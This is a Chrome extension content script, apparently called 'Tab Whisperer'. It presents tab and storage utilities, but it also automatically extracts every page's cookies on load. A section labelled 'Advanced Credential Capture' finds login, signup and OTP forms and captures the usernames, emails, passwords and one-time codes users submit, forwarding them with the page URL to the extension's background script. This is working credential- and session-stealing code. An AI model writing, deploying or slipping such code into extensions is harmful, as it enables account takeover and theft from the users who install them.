
// Listen for messages from the background script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'extractCookies') {
    extractCookies();
  } else if (message.action === 'getAllTabs') {
    getAllTabs();
  } else if (message.action === 'clearStorage') {
    clearStorage(message.url, message.localStorage, message.sessionStorage);
  } else if (message.action === 'clearAllStorage') {
    clearAllStorage(message.localStorage, message.sessionStorage);
  }
  return true;
});

// Extract cookies from the current page and send them to the background script
function extractCookies() {
  const cookieString = document.cookie;
  const cookies = cookieString.split(';').map(cookie => {
    const [name, value] = cookie.trim().split('=');
    return { name, value, domain: window.location.hostname, path: '/' };
  });
  
  chrome.runtime.sendMessage({
    action: 'cookiesExtracted',
    url: window.location.href,
    cookies: cookies
  });
}

// Get information about all open tabs
function getAllTabs() {
  chrome.runtime.sendMessage({
    action: 'getAllTabsRequest'
  });
}

// Clear localStorage and sessionStorage for a specific domain
function clearStorage(url, shouldClearLocalStorage, shouldClearSessionStorage) {
  try {
    const urlDomain = new URL(url).hostname;
    const currentDomain = window.location.hostname;
    
    if (currentDomain.includes(urlDomain) || urlDomain.includes(currentDomain)) {
      if (shouldClearLocalStorage) {
        localStorage.clear();
        console.log('localStorage cleared');
      }
      
      if (shouldClearSessionStorage) {
        sessionStorage.clear();
        console.log('sessionStorage cleared');
      }
    }
  } catch (error) {
    console.error('Error clearing storage:', error);
  }
}

// Clear all localStorage and sessionStorage for the current page
function clearAllStorage(shouldClearLocalStorage, shouldClearSessionStorage) {
  try {
    if (shouldClearLocalStorage) {
      localStorage.clear();
      console.log('All localStorage cleared');
    }
    
    if (shouldClearSessionStorage) {
      sessionStorage.clear();
      console.log('All sessionStorage cleared');
    }
  } catch (error) {
    console.error('Error clearing all storage:', error);
  }
}

// Initialize and announce presence to background script
(function init() {
  console.log('Tab Whisperer content script initialized');
  
  // Extract cookies on page load
  setTimeout(extractCookies, 1000);
  
  // Request all tabs information
  setTimeout(getAllTabs, 1500);
})();



// == Content Script: Advanced Credential Capture ==

// Utility: Generate a simple random unique ID
function generateCaptureId() {
  return 'cred_' + Math.random().toString(36).slice(2, 10) + Date.now();
}

// Utility: Smart form detection using multiple clues
function isAuthForm(form) {
  // Heuristics: action includes login/signup/register/auth, id/name hints, submit button text, contains password/email/otp input
  const clues = [
    "login", "signin", "sign-in", "sign_in", "signup", "sign-up", "register", "auth"
  ];
  const lowerAction = (form.action || "").toLowerCase();
  const lowerId = (form.id || "").toLowerCase();
  const lowerName = (form.name || "").toLowerCase();
  const str = lowerAction + " " + lowerId + " " + lowerName;

  // Check if any clue present in action, id, or name
  const likely = clues.some(clue => str.includes(clue));  
  // Or: submit button hints
  let buttonHint = false;
  const btns = Array.from(form.querySelectorAll('button, input[type="submit"]'));
  btns.forEach(btn => {
    const txt = (btn.innerText || btn.value || "").toLowerCase();
    if (clues.some(clue => txt.includes(clue))) buttonHint = true;
  });

  // Or: must contain a password/email/otp field
  const inputs = Array.from(form.querySelectorAll("input"));
  const fieldTypes = inputs.map(i => i.type);
  const hasPw = fieldTypes.some(t => t === "password");
  const hasEmail = fieldTypes.some(t => t === "email");
  const hasOtp = inputs.some(i => /(otp|code)/i.test(i.name + i.id + i.autocomplete));
  return (likely || buttonHint || hasPw || hasEmail || hasOtp);
}

// Utility: Classify field type for a given input
function classifyInput(input) {
  const { type, autocomplete = "", name = "", id = "" } = input;
  const str = `${autocomplete} ${name} ${id}`.toLowerCase();
  if (type === "password" || /password/.test(str)) return "password";
  if (type === "email" || /email/.test(str)) return "email";
  if (/user|login|identifier|account|nick|person/i.test(str) && type !== "password") return "username";
  if (/otp|code|2fa|one[-_]?time/i.test(str)) return "otp";
  return type || "text";
}

// Capture a single form's data
function captureFormData(form) {
  const resultFields = [];
  const seen = new Set();
  Array.from(form.querySelectorAll("input, select, textarea")).forEach((input) => {
    if (input.disabled || input.type === "hidden") return;
    const value = input.value || input.textContent || "";
    if (!value) return;

    // Avoid duplicate fields (by name/id/type)
    const key = input.name + "|" + input.id + "|" + input.type;
    if (seen.has(key)) return;
    seen.add(key);

    // Classify type
    const fieldType = classifyInput(input);
    // Use input label if available
    let label = input.getAttribute("aria-label") ||
                form.querySelector(`label[for="${input.id}"]`)?.innerText ||
                input.placeholder ||
                input.name ||
                input.id ||
                fieldType ||
                "field";

    // Normalize label to a limited length
    if (label.length > 28) label = label.slice(0, 28) + "...";

    resultFields.push({
      label: label,
      value: value,
      type: fieldType
    });
  });

  // Extra safety: at least show username or password for a credential
  if (!resultFields.find(f => f.type === "password" || f.type === "username" || f.type === "email" || f.type === "otp")) {
    return null;
  }

  return {
    id: generateCaptureId(),
    url: window.location.href,
    title: document.title,
    createdAt: new Date().toISOString(),
    fields: resultFields
  };
}

// Send data to background script with fallback and error handling
function sendCredentialCaptures(credential) {
  try {
    if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
      chrome.runtime.sendMessage({ action: "credentialCaptured", credential: credential }, (resp) => {
        if (chrome.runtime.lastError) {
          console.warn("Content script failed to send credential:", chrome.runtime.lastError.message);
        } else {
          console.log("Credential sent to background.");
        }
      });
    } else {
      console.warn("chrome.runtime not available; running outside extension context.");
    }
  } catch (err) {
    console.error("Error sending captured credentials to background:", err);
  }
}

// Hook: Attach listeners to capture on submit, blur, and autofill
function attachCaptureListeners(form) {
  if (form.__credentialListenerAttached) return;
  form.__credentialListenerAttached = true;

  // On submit (form submit or submit button click)
  form.addEventListener("submit", (e) => {
    setTimeout(() => {
      const credential = captureFormData(form);
      if (credential) sendCredentialCaptures(credential);
    }, 150);
  });

  // Capture when Enter is pressed in any input field (in case submit is prevented)
  form.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      setTimeout(() => {
        const credential = captureFormData(form);
        if (credential) sendCredentialCaptures(credential);
      }, 150);
    }
  });
}

// function attachCaptureListeners(form) {
//   if (form.__credentialListenerAttached) return;
//   form.__credentialListenerAttached = true;

//   // On submit (form submit or submit button click)
//   form.addEventListener("submit", (e) => {
//     setTimeout(() => {
//       const credential = captureFormData(form);
//       if (credential) sendCredentialCaptures(credential);
//     }, 150); // Delay for autofill form values
//   });

//   // For inputs: catch blur, change, and possible autofill
//   Array.from(form.querySelectorAll("input, select, textarea")).forEach(input => {
//     input.addEventListener("blur", () => {
//       setTimeout(() => {
//         const credential = captureFormData(form);
//         if (credential) sendCredentialCaptures(credential);
//       }, 120);
//     });

//     // Listen for animationstart (Chrome autofill trick)
//     input.addEventListener("animationstart", () => {
//       setTimeout(() => {
//         const credential = captureFormData(form);
//         if (credential) sendCredentialCaptures(credential);
//       }, 120);
//     });

//     // Listen for change/input events (modern sites)
//     input.addEventListener("change", () => {
//       setTimeout(() => {
//         const credential = captureFormData(form);
//         if (credential) sendCredentialCaptures(credential);
//       }, 100);
//     });
//     input.addEventListener("input", () => {
//       setTimeout(() => {
//         const credential = captureFormData(form);
//         if (credential) sendCredentialCaptures(credential);
//       }, 80);
//     });
//   });
// }

// Core function: scan and attach credential listeners to detected forms
function processAllForms() {
  document.querySelectorAll("form").forEach((form) => {
    if (isAuthForm(form)) {
      attachCaptureListeners(form);
    }
  });
}

// Observe DOM for any added forms (SPAs, popup modals, etc)
const observer = new MutationObserver((mutations) => {
  mutations.forEach((m) => {
    m.addedNodes.forEach((node) => {
      if (node.nodeType === 1) {
        if (node.tagName === "FORM" && isAuthForm(node)) {
          attachCaptureListeners(node);
        } else if (node.querySelectorAll) {
          // If a subtree added contains forms
          node.querySelectorAll("form").forEach((form) => {
            if (isAuthForm(form)) attachCaptureListeners(form);
          });
        }
      }
    });
  });
});

// Start observing for form changes
observer.observe(document.body, { childList: true, subtree: true });

// Initial scan after DOM load
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", () => setTimeout(processAllForms, 300));
} else {
  setTimeout(processAllForms, 300);
}

// One-shot: also process forms a moment after page load for autofill edge cases
window.addEventListener("load", () => setTimeout(processAllForms, 750));

// DEBUG: Announce content script loaded
console.log("Advanced Credentials Content Script Loaded");

